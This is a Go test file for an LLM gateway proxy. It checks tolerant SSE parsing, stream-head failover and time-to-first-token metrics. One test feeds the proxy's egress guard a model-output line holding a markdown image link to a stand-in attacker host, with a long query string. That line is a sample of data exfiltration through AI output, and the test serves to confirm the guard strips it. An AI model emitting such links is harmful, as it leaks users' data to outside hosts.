package proxy

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/nenya/config"
	"github.com/nenya/internal/routing"
	"github.com/nenya/internal/stream"
	"github.com/nenya/internal/testutil"
)

// NENYA-197 — the SSE tolerance must reach every consumer of upstream bytes, not
// just the streaming transformer: the buffered MCP path, the MCP egress guards
// and the stream-head probe each parse upstream SSE of their own, and a strict
// parser there silently drops a field (or, for the guards, never scans it).

func TestBufferStreamResponse_NonCanonicalFraming(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	tests := []struct {
		name string
		sse  string
	}{
		{
			name: "no space after the colon",
			sse: "data:{\"id\":\"1\",\"choices\":[{\"delta\":{\"content\":\"Hello\"}}]}\n" +
				"data:{\"id\":\"1\",\"choices\":[{\"delta\":{},\"finish_reason\":\"stop\"}]}\n" +
				"data:[DONE]\n\n",
		},
		{
			name: "cr-only line endings",
			sse: "data: {\"id\":\"1\",\"choices\":[{\"delta\":{\"content\":\"Hello\"}}]}\r" +
				"data: {\"id\":\"1\",\"choices\":[{\"delta\":{},\"finish_reason\":\"stop\"}]}\r" +
				"data: [DONE]\r\r",
		},
		{
			name: "mixed endings",
			sse: "data:{\"id\":\"1\",\"choices\":[{\"delta\":{\"content\":\"Hello\"}}]}\r\n" +
				"data: {\"id\":\"1\",\"choices\":[{\"delta\":{},\"finish_reason\":\"stop\"}]}\n" +
				"data:[DONE]\n\n",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			buf, err := bufferStreamResponse(context.Background(), strings.NewReader(tt.sse), logger, "", routing.UpstreamTarget{})
			if err != nil {
				t.Fatalf("bufferStreamResponse: %v", err)
			}
			if !buf.hasContent {
				t.Fatalf("hasContent = false; the non-canonical stream was read as an empty response")
			}
			if !strings.Contains(string(buf.rawBytes), "Hello") {
				t.Fatalf("replayed stream lost the content: %q", string(buf.rawBytes))
			}
			if buf.finishReason != "stop" {
				t.Fatalf("finishReason = %q, want stop", buf.finishReason)
			}
			// The replayed stream is canonical so downstream consumers agree.
			if !strings.Contains(string(buf.rawBytes), "data: [DONE]") {
				t.Fatalf("replayed stream is not canonical: %q", string(buf.rawBytes))
			}
		})
	}
}

func TestGuardBufferedLine_NonCanonicalField(t *testing.T) {
	// A URL the guard strips: the payload must be scanned even without the space
	// after the colon (the guard is an egress control, so a silent skip is a
	// security gap).
	guard := stream.NewExfilGuard(config.ExfilGuardConfig{Action: config.ExfilActionStrip, MaxQueryChars: 8}, nil)
	longQuery := strings.Repeat("A", 400)
	line := `data:{"choices":[{"delta":{"content":"![b](https://evil.example.com/x?d=` + longQuery + `)"}}]}`
	rewritten, blocked, changed := (&Proxy{}).guardBufferedLine(guard, line)
	if !blocked && !changed {
		t.Fatalf("the guard did not act on a no-space data line: %q", rewritten)
	}
	if strings.Contains(rewritten, "evil.example") && !blocked {
		t.Fatalf("the guard left the URL in place: %q", rewritten)
	}
}

func TestClassifyStreamHead_NonCanonicalFraming(t *testing.T) {
	tests := []struct {
		name  string
		chunk string
		want  streamHeadKind
	}{
		{
			name:  "cr-only error",
			chunk: "data: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\r\r",
			want:  headError,
		},
		{
			name:  "no-space error",
			chunk: "data:{\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\n\n",
			want:  headError,
		},
		{
			name:  "cr-only content",
			chunk: "data: {\"choices\":[{\"delta\":{\"content\":\"hi\"}}]}\r\r",
			want:  headNormal,
		},
		{
			// The discriminating case: with LF-only splitting the whole chunk
			// was one line starting with the comment, so the error frame after
			// it was never seen and NENYA-45 early failover never fired.
			name:  "cr-only comment then error",
			chunk: ": ping\r\rdata: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\r\r",
			want:  headError,
		},
		{
			// The first complete, meaningful payload wins: a metadata frame
			// before an error frame is headNormal (never fail over past bytes
			// that may already be content).
			name:  "metadata then error stays headNormal",
			chunk: "data: {\"type\":\"message_start\"}\r\rdata: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}\r\r",
			want:  headNormal,
		},
		{
			// A one-shot probe has no next read: an error frame that arrived
			// without a terminator must still classify (NENYA-45 failover).
			name:  "unterminated error frame",
			chunk: "data: {\"error\":{\"message\":\"overloaded\",\"type\":\"server_error\"}}",
			want:  headError,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := classifyStreamHead([]byte(tt.chunk)); got != tt.want {
				t.Fatalf("classifyStreamHead = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestScanBootstrapBuffer_NonCanonicalFraming(t *testing.T) {
	tests := []struct {
		name        string
		acc         string
		wantVerdict bootstrapVerdict
		wantOffset  int
	}{
		{
			name:        "cr-only rejection is consumed",
			acc:         "data: {\"type\":\"response.failed\"}\r\r",
			wantVerdict: bootstrapReject,
			// The walk stops just past the line that decided (its CR
			// terminator included); the trailing blank line is not needed.
			wantOffset: len("data: {\"type\":\"response.failed\"}\r"),
		},
		{
			name:        "no-space rejection is consumed",
			acc:         "data:{\"type\":\"response.failed\"}\n\n",
			wantVerdict: bootstrapReject,
			wantOffset:  len("data:{\"type\":\"response.failed\"}\n"),
		},
		{
			name:        "incomplete cr-terminated line stays unscanned",
			acc:         "data: {\"type\":\"response.failed\"}\r",
			wantVerdict: bootstrapUndetermined,
			wantOffset:  0,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			verdict, offset := scanBootstrapBuffer([]byte(tt.acc), 0)
			if verdict != tt.wantVerdict {
				t.Fatalf("verdict = %v, want %v", verdict, tt.wantVerdict)
			}
			if offset != tt.wantOffset {
				t.Fatalf("offset = %d, want %d", offset, tt.wantOffset)
			}
		})
	}
}

// TestStreamingRequestRecordsTTFT pins the end-to-end clock (NENYA-178): the
// time-to-first-effective-output is recorded per (model, provider) on a
// streaming request, it stops at the first CONTENT frame (not at the role-only
// handshake that precedes it), and /statsz exposes the median.
func TestStreamingRequestRecordsTTFT(t *testing.T) {
	const handshakeToContentDelay = 60 * time.Millisecond
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		// Handshake frames: they must NOT stop the TTFT clock.
		_, _ = fmt.Fprint(w, "data: {\"choices\":[{\"delta\":{\"role\":\"assistant\"}}]}\n\n")
		_, _ = fmt.Fprint(w, "data: {\"choices\":[{\"delta\":{}}]}\n\n")
		if f, ok := w.(http.Flusher); ok {
			f.Flush()
		}
		time.Sleep(handshakeToContentDelay)
		_, _ = fmt.Fprint(w, "data: {\"choices\":[{\"delta\":{\"content\":\"hello\"}}]}\n\n")
		_, _ = fmt.Fprint(w, "data: [DONE]\n\n")
		if f, ok := w.(http.Flusher); ok {
			f.Flush()
		}
	}))
	defer upstream.Close()

	p := newChatProxy(t, upstream.URL)
	body := `{"model":"test-agent","messages":[{"role":"user","content":"hi"}],"stream":true}`
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, testutil.NewTestRequest(t, http.MethodPost, "/v1/chat/completions", body))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body: %s)", rec.Code, rec.Body.String())
	}

	gw := p.Gateway()
	ml, ok := gw.LatencyTracker.Get("test-model", "test-provider")
	if !ok {
		t.Fatal("no latency record for (test-model, test-provider)")
	}
	if ml.TTFTSampleSize != 1 {
		t.Fatalf("TTFT samples = %d, want 1", ml.TTFTSampleSize)
	}
	// The upstream sleeps the full delay after flushing the handshake frames,
	// so a clock that stopped at a handshake would read ~0 while a correct one
	// reads at least the delay. The upper bound only guards against a runaway.
	if ml.MedianTTFT < handshakeToContentDelay {
		t.Fatalf("MedianTTFT = %v, want >= %v (the clock must not stop at a handshake frame)",
			ml.MedianTTFT, handshakeToContentDelay)
	}
	if ml.MedianTTFT > handshakeToContentDelay+2*time.Second {
		t.Fatalf("MedianTTFT = %v, implausibly above the upstream delay %v", ml.MedianTTFT, handshakeToContentDelay)
	}
	if ml.SampleSize != 1 {
		t.Fatalf("full-request samples = %d, want 1", ml.SampleSize)
	}

	statsRec := httptest.NewRecorder()
	p.ServeHTTP(statsRec, testutil.NewTestRequest(t, http.MethodGet, "/statsz", nil))
	statsBody := statsRec.Body.String()
	if !strings.Contains(statsBody, "median_ttft_ms") || !strings.Contains(statsBody, "ttft_sample_size") {
		t.Fatalf("/statsz does not expose the TTFT dimension: %s", statsBody)
	}
	if !strings.Contains(statsBody, "test-model:test-provider") {
		t.Fatalf("/statsz latency section is missing the pair: %s", statsBody)
	}

	// The Prometheus histogram is wired from the same callback: a streamed
	// request must be observable to a scraper, not only through the tracker.
	var metrics bytes.Buffer
	gw.Metrics.WritePrometheus(&metrics)
	if !strings.Contains(metrics.String(), `nenya_ttft_seconds_count{agent="test-agent", model="test-model", provider="test-provider"} 1`) {
		t.Fatalf("nenya_ttft_seconds was not observed for the streamed request: %s",
			metrics.String())
	}
}

// TestBufferedRequestRecordsNoTTFT pins the observable scope of the clock
// (NENYA-178): a non-streaming request has no first-token semantic, so its
// latency entry carries the upstream response-header dimension only. The
// buffered path never builds an SSE transforming reader, so this guards against
// a future recorder wired onto it rather than against a reader-side regression.
func TestBufferedRequestRecordsNoTTFT(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = fmt.Fprint(w, `{"choices":[{"message":{"role":"assistant","content":"hi"},"finish_reason":"stop"}]}`)
	}))
	defer upstream.Close()

	p := newChatProxy(t, upstream.URL)
	body := `{"model":"test-agent","messages":[{"role":"user","content":"hi"}]}`
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, testutil.NewTestRequest(t, http.MethodPost, "/v1/chat/completions", body))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (body: %s)", rec.Code, rec.Body.String())
	}

	ml, ok := p.Gateway().LatencyTracker.Get("test-model", "test-provider")
	if !ok {
		t.Fatal("no latency record for a buffered request")
	}
	if ml.TTFTSampleSize != 0 {
		t.Fatalf("a buffered request recorded %d TTFT samples, want 0", ml.TTFTSampleSize)
	}
	if ml.SampleSize != 1 {
		t.Fatalf("full-request samples = %d, want 1", ml.SampleSize)
	}
}

// TestReasoningOnlyStreamTTFTFollowsConfig pins the config plumbing end to end
// (NENYA-178): a reasoning-only stream records no TTFT by default (a
// slow-thinking model must not look slow-to-first-token) and does record one
// when governance.ttft_include_reasoning opts in.
func TestReasoningOnlyStreamTTFTFollowsConfig(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		_, _ = fmt.Fprint(w, "data: {\"choices\":[{\"delta\":{\"role\":\"assistant\"}}]}\n\n")
		_, _ = fmt.Fprint(w, "data: {\"choices\":[{\"delta\":{\"reasoning_content\":\"thinking hard\"}}]}\n\n")
		_, _ = fmt.Fprint(w, "data: [DONE]\n\n")
	}))
	defer upstream.Close()

	for _, includeReasoning := range []bool{false, true} {
		t.Run(fmt.Sprintf("include_reasoning=%v", includeReasoning), func(t *testing.T) {
			p := newChatProxy(t, upstream.URL)
			p.Gateway().Config.Governance.TTFTIncludeReasoning = includeReasoning
			body := `{"model":"test-agent","messages":[{"role":"user","content":"hi"}],"stream":true}`
			rec := httptest.NewRecorder()
			p.ServeHTTP(rec, testutil.NewTestRequest(t, http.MethodPost, "/v1/chat/completions", body))
			if rec.Code != http.StatusOK {
				t.Fatalf("status = %d, want 200 (body: %s)", rec.Code, rec.Body.String())
			}

			ml, ok := p.Gateway().LatencyTracker.Get("test-model", "test-provider")
			if !ok {
				t.Fatal("no latency record")
			}
			want := 0
			if includeReasoning {
				want = 1
			}
			if ml.TTFTSampleSize != want {
				t.Fatalf("TTFT samples = %d, want %d", ml.TTFTSampleSize, want)
			}
		})
	}
}

// TestStatszOmitsEmptyLatencySection pins the /statsz contract (NENYA-178): the
// latency section is absent when nothing has been observed, so a scraper never
// sees a permanently empty object.
func TestStatszOmitsEmptyLatencySection(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = fmt.Fprint(w, `{"choices":[]}`)
	}))
	defer upstream.Close()

	p := newChatProxy(t, upstream.URL)
	rec := httptest.NewRecorder()
	p.ServeHTTP(rec, testutil.NewTestRequest(t, http.MethodGet, "/statsz", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", rec.Code)
	}
	var stats map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &stats); err != nil {
		t.Fatalf("statsz is not JSON: %v", err)
	}
	if _, present := stats["latency"]; present {
		t.Fatalf("an unobserved gateway exposed an empty latency section: %v", stats["latency"])
	}
}

// TestSetupTTFTRecorderIgnoresZeroDispatch pins the guard that makes the
// continuation skip work (NENYA-178): a zero dispatch instant means "do not
// measure this attempt", so no sample is recorded even when output arrives.
func TestSetupTTFTRecorderIgnoresZeroDispatch(t *testing.T) {
	p := newChatProxy(t, "http://127.0.0.1:1")
	gw := p.Gateway()
	r := stream.NewSSETransformingReader(strings.NewReader(
		"data: {\"choices\":[{\"delta\":{\"content\":\"hi\"}}]}\n\ndata: [DONE]\n\n"), nil, context.Background())
	setupTTFTRecorder(gw, transformReaderOpts{
		target:    routing.UpstreamTarget{Model: "test-model", Provider: "test-provider"},
		agentName: "test-agent",
	}, r)
	if _, err := io.Copy(io.Discard, r); err != nil {
		t.Fatalf("copy: %v", err)
	}
	if ml, ok := gw.LatencyTracker.Get("test-model", "test-provider"); ok && ml.TTFTSampleSize != 0 {
		t.Fatalf("a zero dispatch instant recorded %d TTFT samples, want 0", ml.TTFTSampleSize)
	}
}
